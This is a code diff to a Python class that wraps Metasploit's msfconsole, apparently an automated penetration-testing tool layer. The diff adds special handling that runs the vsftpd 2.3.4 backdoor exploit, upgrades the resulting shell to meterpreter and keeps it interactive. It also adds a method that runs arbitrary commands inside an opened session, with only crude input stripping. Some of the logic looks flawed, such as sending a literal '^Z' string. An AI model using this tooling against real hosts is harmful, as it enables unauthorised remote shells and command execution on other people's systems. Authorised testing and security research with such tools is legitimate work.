@@ -228,7 +228,10 @@ class MetasploitTools:
             # Build the command
             cmd_parts = [f"use {exploit_module}", f"set RHOSTS {target}"]
             
-            if payload:
+            # Special handling for VSFTPD 2.3.4 backdoor exploit
+            is_vsftpd_exploit = "vsftpd_234_backdoor" in exploit_module
+            
+            if payload and not is_vsftpd_exploit:
                 cmd_parts.append(f"set PAYLOAD {payload}")
             
             if options:
@@ -238,21 +241,44 @@ class MetasploitTools:
                     safe_value = value.replace("'", "").replace('"', "").replace(";", "")
                     cmd_parts.append(f"set {safe_key} {safe_value}")
             
-            cmd_parts.extend(["show options", "exploit", "exit"])
+            # Add special settings for vsftpd exploit to make the shell interactive
+            if is_vsftpd_exploit:
+                # For vsftpd exploit, we need to make sure there's a handler ready
+                cmd_parts.append("set LPORT 21")
+                cmd_parts.append("set VERBOSE true")
+                
+                # For interactive shell, we need to ensure we're using the right session handling
+                cmd_parts.append("set AutoRunScript 'post/multi/manage/shell_to_meterpreter'")
+            
+            cmd_parts.extend(["show options", "exploit"])
+            
+            # For interactive shells, don't exit immediately
+            if is_vsftpd_exploit:
+                cmd_parts.append("sessions -i 1")
+                # Don't add exit for interactive sessions
+            else:
+                cmd_parts.append("exit")
             
             # Join all commands with semicolons
             msf_commands = "; ".join(cmd_parts)
             
-            # Use msfconsole to run the exploit
-            output = self._run_msfconsole_command(msf_commands, timeout=120)
+            # Use msfconsole to run the exploit with longer timeout for interactive sessions
+            timeout = 300 if is_vsftpd_exploit else 120
+            output = self._run_msfconsole_command(msf_commands, timeout=timeout)
             
             # Store the raw output for later use
             self.last_command_output = output
             
-            if "Exploit completed" in output:
-                return f"Exploit execution completed. Results:\n{output}"
+            if is_vsftpd_exploit:
+                if "opened successfully" in output or "Command shell session" in output:
+                    return f"VSFTPD exploit succeeded. Interactive session established:\n{output}"
+                else:
+                    return f"VSFTPD exploit attempt completed. Results:\n{output}"
             else:
-                return f"Exploit execution results:\n{output}"
+                if "Exploit completed" in output:
+                    return f"Exploit execution completed. Results:\n{output}"
+                else:
+                    return f"Exploit execution results:\n{output}"
         
         except Exception as e:
             return f"Error running exploit: {str(e)}"
@@ -339,6 +365,55 @@ class MetasploitTools:
         
         except Exception as e:
             return f"Error listing sessions: {str(e)}"
+    
+    def handle_interactive_shell(self, session_id: int = 1, commands: List[str] = None) -> str:
+        """
+        Handles an interactive shell session.
+        
+        Args:
+            session_id: The session ID to interact with
+            commands: Optional list of commands to run in the session
+            
+        Returns:
+            Result of the interaction
+        """
+        try:
+            # Validate session ID
+            if not isinstance(session_id, int) or session_id <= 0:
+                return "Error: Invalid session ID. Must be a positive integer."
+            
+            # Check if the session exists
+            session_check = self.list_sessions()
+            if f"Id: {session_id}" not in session_check and "No active Metasploit sessions" not in session_check:
+                return f"Error: Session {session_id} does not exist."
+            
+            # Build msfconsole command to interact with the session
+            cmd_parts = [f"sessions -i {session_id}"]
+            
+            # Add commands to run in the session if provided
+            if commands and isinstance(commands, list):
+                for cmd in commands:
+                    # Sanitize command to prevent command injection
+                    safe_cmd = cmd.replace("'", "").replace('"', "").replace(";", "")
+                    cmd_parts.append(safe_cmd)
+            
+            # Add exit command to return to msfconsole
+            cmd_parts.append("^Z")  # Ctrl+Z to background the session
+            cmd_parts.append("exit")  # Exit msfconsole
+            
+            # Join all commands with semicolons
+            msf_commands = "; ".join(cmd_parts)
+            
+            # Use msfconsole to interact with the session with a longer timeout
+            output = self._run_msfconsole_command(msf_commands, timeout=180)
+            
+            # Store the raw output for later use
+            self.last_command_output = output
+            
+            return f"Interactive shell session {session_id} results:\n{output}"
+        
+        except Exception as e:
+            return f"Error handling interactive shell: {str(e)}"
     
     def _is_valid_target(self, target: str) -> bool:
         """Validates if target is a valid IP address or hostname"""
